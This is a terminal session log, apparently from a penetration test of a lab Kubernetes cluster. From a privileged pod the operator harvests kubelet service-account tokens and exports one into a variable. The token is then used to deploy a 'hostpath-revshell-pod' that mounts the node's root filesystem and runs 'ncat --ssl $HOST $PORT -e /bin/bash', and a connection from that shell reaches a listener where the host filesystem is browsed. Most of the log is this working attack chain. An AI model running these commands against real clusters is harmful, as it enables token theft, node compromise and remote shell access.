
eddyt@contranimbus MINGW64 ~/OneDrive - Personal/OneDrive/Documents/personal/hera
$ ssh -i 756245.pem ubuntu@172.22.14.30
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-106-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  5 20:00:36 UTC 2024

  System load:  0.60693359375      Processes:             188
  Usage of /:   78.7% of 19.20GB   Users logged in:       1
  Memory usage: 52%                IPv4 address for ens3: 172.22.14.30
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***
Last login: Fri Jul  5 19:47:34 2024 from 172.22.0.254
ubuntu@test-master:~$ kubectl get pods -n spark-operator
NAME                                                  READY   STATUS    RESTARTS      AGE
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running   0             11m
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running   0             11m
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running   0             11m
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running   0             11m
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running   0             11m
hostpath-revshell-pod                                 0/1     Error     4 (47s ago)   97s
spark-operator-69b84c8f48-l66x8                       1/1     Running   0             4h7m
ubuntu@test-master:~$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS      AGE    IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0             11m    172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0             11m    172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0             11m    172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   4 (16s ago)   107s   192.168.101.85   test-master2    <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0             4h8m   192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS      AGE    IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0             11m    172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0             11m    172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0             11m    172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   4 (31s ago)   2m2s   192.168.101.85   test-master2    <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0             4h8m   192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS      AGE    IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0             11m    172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0             11m    172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0             11m    172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0             11m    172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   4 (33s ago)   2m4s   192.168.101.85   test-master2    <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0             4h8m   192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~$ kubectl logs hostpath-revshell-pod -n spark-operator
Ncat: Connection refused.
ubuntu@test-master:~$ kubectl logs hostpath-revshell-pod -n spark-operator
Ncat: Connection refused.
ubuntu@test-master:~$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS      AGE     IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0             12m     172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0             12m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0             12m     172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0             12m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0             12m     172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   4 (81s ago)   2m52s   192.168.101.85   test-master2    <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0             4h9m    192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~$ ^C
ubuntu@test-master:~$ kubectl get networkpolicies -n spark-operator
No resources found in spark-operator namespace.
ubuntu@test-master:~$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS      AGE     IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0             13m     172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0             13m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0             13m     172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0             13m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0             13m     172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   5 (43s ago)   3m47s   192.168.101.85   test-master2    <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0             4h10m   192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~$ ^C
ubuntu@test-master:~$ cd ghv3/microservices/
ubuntu@test-master:~/ghv3/microservices$ kubectl create -f deny-all.yml
networkpolicy.networking.k8s.io/default-deny created
ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-policy.yml
networkpolicy.networking.k8s.io/ts-policy created
ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-locust-policy
error: the path "teastore-locust-policy" does not exist
ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-locust-policy.yml
networkpolicy.networking.k8s.io/ts-locust-policy created
ubuntu@test-master:~/ghv3/microservices$ helm install teastore -n teastore-helm/
Error: INSTALLATION FAILED: must either provide a name or specify --generate-name
ubuntu@test-master:~/ghv3/microservices$ helm install teastore teastore-helm/   NAME: teastore
LAST DEPLOYED: Fri Jul  5 20:32:59 2024
NAMESPACE: test
STATUS: deployed
REVISION: 1
TEST SUITE: None
ubuntu@test-master:~/ghv3/microservices$ kubectl get pods -n spark-operator
NAME                                                  READY   STATUS             RESTARTS       AGE
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0              43m
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0              43m
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0              43m
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0              43m
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0              43m
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   10 (43s ago)   28m
spark-operator-69b84c8f48-l66x8                       1/1     Running            0              4h40m
ubuntu@test-master:~/ghv3/microservices$ kubectl get pods -n spark-operator -o wide
NAME                                                  READY   STATUS             RESTARTS       AGE     IP               NODE            NOMINATED NODE   READINESS GATES
everything-allowed-exec-deployment-5b68c8d877-289t4   1/1     Running            0              44m     172.22.14.31     test-worker-1   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-64pbw   1/1     Running            0              44m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-8qc44   1/1     Running            0              44m     172.22.14.32     test-worker-2   <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-cgxp9   1/1     Running            0              44m     172.22.14.33     test-master2    <none>           <none>
everything-allowed-exec-deployment-5b68c8d877-xn9nh   1/1     Running            0              44m     172.22.14.34     test-worker-4   <none>           <none>
hostpath-revshell-pod                                 0/1     CrashLoopBackOff   10 (65s ago)   28m     192.168.33.54    test-worker-1   <none>           <none>
spark-operator-69b84c8f48-l66x8                       1/1     Running            0              4h41m   192.168.101.73   test-master2    <none>           <none>
ubuntu@test-master:~/ghv3/microservices$ kubectl delete pod -n spark-operator hostpath-revshell-pod
pod "hostpath-revshell-pod" deleted
ubuntu@test-master:~/ghv3/microservices$ kubectl exec -it everything-allowed-exec-deployment-5b68c8d877-64pbw -n spark-operator -- bash
root@test-master2:/# echo $cred

root@test-master2:/# ./can-they.sh | grep pod
Token Location: /host/var/lib/kubelet/pods/61e290c3-ead4-4d27-99bc-d028c7f6dfa6/volumes/kubernetes.io~projected/kube-api-access-x82bw/token
Token Location: /host/var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
Token Location: /host/var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
pods                                            []                                     []               [get list watch]
pods/status                                     []                                     []               [patch]
Token Location: /host/var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
Token Location: /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
pods                                                           []                                     []               [*]
Token Location: /host/var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
Token Location: /host/var/lib/kubelet/pods/29856fbe-9672-4b6a-b7ec-700ba58b8a55/volumes/kubernetes.io~projected/kube-api-access-wz59q/token
Token Location: /host/var/lib/kubelet/pods/e69f6ef8-0a96-4fd0-b94f-4980953e734b/volumes/kubernetes.io~projected/kube-api-access-p8cdh/token
Token Location: /host/var/lib/kubelet/pods/6100ada5-4186-48dc-be79-a1a3b284b6af/volumes/kubernetes.io~projected/kube-api-access-mrk4g/token
root@test-master2:/# ./can-they.sh | grep pod
Token Location: /host/var/lib/kubelet/pods/61e290c3-ead4-4d27-99bc-d028c7f6dfa6/volumes/kubernetes.io~projected/kube-api-access-x82bw/token
Token Location: /host/var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
Token Location: /host/var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
pods                                            []                                     []               [get list watch]
pods/status                                     []                                     []               [patch]
Token Location: /host/var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
Token Location: /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
pods                                                           []                                     []               [*]
Token Location: /host/var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
Token Location: /host/var/lib/kubelet/pods/29856fbe-9672-4b6a-b7ec-700ba58b8a55/volumes/kubernetes.io~projected/kube-api-access-wz59q/token
Token Location: /host/var/lib/kubelet/pods/e69f6ef8-0a96-4fd0-b94f-4980953e734b/volumes/kubernetes.io~projected/kube-api-access-p8cdh/token
Token Location: /host/var/lib/kubelet/pods/6100ada5-4186-48dc-be79-a1a3b284b6af/volumes/kubernetes.io~projected/kube-api-access-mrk4g/token
root@test-master2:/# export cred=`cat /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token`
root@test-master2:/# cd badPods/
root@test-master2:/badPods# HOST="172.22.14.33" PORT="8080" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply --token=$cred -f -
pod/hostpath-revshell-pod created
root@test-master2:/badPods# chroot /host bash
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 7AD2 BA1B C00B DA6B 371C FA50 A14B 22D3 BD64 5E97
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 192.168.101.76.
Ncat: Connection from 192.168.101.76:60570.
ip
cd /host
ls
badPods
bin
boot
can-they.sh
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
teastore
tmp
usr
var
exit
root@test-master2:/# exit
exit
root@test-master2:/badPods# more manifests/
everything-allowed/ hostipc/            hostnetwork/        hostpath/           hostpid/            nothing-allowed/    priv/               priv-and-hostpid/
root@test-master2:/badPods# more manifests/hostpath/pod/hostpath-revshell-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-revshell-pod
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-revshell-pod
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
root@test-master2:/badPods# sed 's/hostpath-revshell-pod/hostpath-revshell-pod-1/g' manifests/hostpath/pod/hostpath-revshell-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-revshell-pod-1
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-revshell-pod-1
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
root@test-master2:/badPods# sed 's/hostpath-revshell-pod/hostpath-revshell-pod-1/g' manifests/hostpath/pod/hostpath-revshell-pod.yaml >  manifests/hostpath/pod/hostpath-revshell-pod-1.yaml
root@test-master2:/badPods# HOST="172.22.14.33" PORT="8080" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod-1.yaml | kubectl apply --token=$cred -f -
pod/hostpath-revshell-pod-1 created
root@test-master2:/badPods# chroot /host bash
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 52E9 1A6A 98E3 65B9 5849 1415 62FD B61A EB67 1906
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
^C
root@test-master2:/# exit
exit
root@test-master2:/badPods# kubectl delete -f manifests/hostpath/pod/hostpath-revshell-pod-1.yaml
Error from server (Forbidden): error when deleting "manifests/hostpath/pod/hostpath-revshell-pod-1.yaml": pods "hostpath-revshell-pod-1" is forbidden: User "system:serviceaccount:spark-operator:default" cannot delete resource "pods" in API group "" in the namespace "spark-operator"
root@test-master2:/badPods# kubectl delete -f manifests/hostpath/pod/hostpath-revshell-pod-1.yaml --token=$cred
pod "hostpath-revshell-pod-1" deleted
root@test-master2:/badPods# HOST="172.22.14.33" PORT="8080" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod-1.yaml | kubectl apply --token=$cred -f -
pod/hostpath-revshell-pod-1 created
root@test-master2:/badPods# chroot /host bash
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: DBB4 3476 55F2 F314 6376 B42B CE52 6E04 64DA 296F
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 192.168.101.78.
Ncat: Connection from 192.168.101.78:39486.
^C
root@test-master2:/# exit
exit
root@test-master2:/badPods# HOST="172.22.14.33" PORT="8080" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply --token=$cred -f -
pod/hostpath-revshell-pod created
root@test-master2:/badPods# chroot /host bash
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 6FE4 35EA C7A0 DDA9 5289 9294 D88C 7D65 0A10 3F02
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
^[[A^[[B^C
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B603 3DA1 6DBE AFAC 3E81 0FA5 A1A3 697A A65B 7472
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
^[[A^C
root@test-master2:/# exit
exit
root@test-master2:/badPods# ip 4 --addr show | grep inet
Object "4" is unknown, try "ip help".
root@test-master2:/badPods# ip --addr show | grep inet
Option "-addr" is unknown, try "ip -help".
root@test-master2:/badPods# ip 4 addr show | grep inet
Object "4" is unknown, try "ip help".
root@test-master2:/badPods# ip addr show | grep inet
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
    inet 172.22.14.33/24 metric 100 brd 172.22.14.255 scope global dynamic ens3
    inet6 fe80::f816:3eff:fe0b:aa7/64 scope link
    inet6 fe80::ecee:eeff:feee:eeee/64 scope link
    inet6 fe80::ecee:eeff:feee:eeee/64 scope link
    inet6 fe80::ecee:eeff:feee:eeee/64 scope link
    inet6 fe80::ecee:eeff:feee:eeee/64 scope link
    inet6 fe80::ecee:eeff:feee:eeee/64 scope link
root@test-master2:/badPods# chroot /host bash
root@test-master2:/# ncat --ssl -vlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: E704 A7E9 3C2A B83F 3192 3D1B 46AD 26A9 5FD4 C43B
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
